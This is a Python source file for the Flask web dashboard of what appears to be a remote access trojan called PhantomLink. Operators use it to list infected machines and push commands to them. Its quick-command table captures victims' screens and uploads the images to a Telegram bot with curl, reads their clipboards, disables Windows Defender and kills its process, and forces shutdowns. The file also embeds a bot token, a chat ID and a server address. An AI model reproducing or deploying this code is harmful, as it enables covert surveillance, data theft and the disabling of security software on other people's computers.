"""
Simple Flask Dashboard - No SocketIO, Pure AJAX
Works perfectly with PyInstaller
"""
import sys
from flask import Flask, render_template, request, jsonify
import threading
import json
import logging

log = logging.getLogger('werkzeug')
logging.disable(logging.CRITICAL)

cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'PhantomLink2026'

# Global reference to client_manager
client_manager = None

# Telegram credentials
BOT_TOKEN = "7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw"
CHAT_ID = "6042298920"

QUICK_COMMANDS = {
    'screenshot': [
        'powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); $path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; $bmp.Save($path)"',
        f'curl -F "photo=@%USERPROFILE%\\\\screenshot.png" https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={CHAT_ID}'
    ],
    'sysinfo': ['systeminfo'],
    'systeminfo': ['systeminfo'],
    'sys': ['systeminfo'],
    'task': ['tasklist'],
    'clipboard': ['powershell -command "Get-Clipboard"'],
    'recycle': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'],
    'sleep': ['rundll32.exe powrprof.dll,SetSuspendState 0,1,0'],
    'lock': ['rundll32.exe user32.dll,LockWorkStation'],
    'rickroll': ['start https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    'shutdown': ['shutdown /s /f /t 0'],
    'restart': ['shutdown /r /f /t 0'],
    'killav': [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'taskkill /F /IM MsMpEng.exe'
    ],
    'ip': ['powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"']
}

def expand_command(command):
    """Expand quick commands"""
    cmd_lower = command.lower().strip()
    return QUICK_COMMANDS.get(cmd_lower, [command])

@app.route('/')
def index():
    """Main dashboard"""
    return render_template('dashboard.html')

@app.route('/api/clients')
def api_clients():
    """Get connected clients"""
    if not client_manager:
        return jsonify([])

    clients = client_manager.list_clients()
    client_list = []

    for cid, client in clients.items():
        client_list.append({
            'id': cid,
            'username': client['username'],
            'ip': client['addr'][0],
            'connected_at': client['connected_at'],
            'active': client['active']
        })

    return jsonify(client_list)

@app.route('/api/command/<int:client_id>', methods=['POST'])
def api_command(client_id):
    """Execute command"""
    if not client_manager:
        return jsonify({'error': 'Server not initialized'}), 500

    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({'error': 'No command'}), 400

    client = client_manager.get_client(client_id)
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    commands_to_execute = expand_command(command)
    outputs = []

    try:
        for cmd in commands_to_execute:
            with client['lock']:
                client['command_in_progress'] = True

                if not client_manager._send_message(client['conn'], f"CMD:{cmd}"):
                    outputs.append('[ERROR] Failed to send')
                    client['command_in_progress'] = False
                    continue

                response = client_manager._recv_message(client['conn'])
                client['command_in_progress'] = False

            if response:
                outputs.append(response.decode('utf-8', errors='ignore'))
            else:
                outputs.append('[No response]')

        return jsonify({'output': '\n---\n'.join(outputs)})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

def start_dashboard(cm, port=7000):
    """Start dashboard"""
    global client_manager
    client_manager = cm

    print(f"[+]Web Dashboard: http://81.10.55.8:{port}")

    # Use werkzeug server (built into Flask, no eventlet needed)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)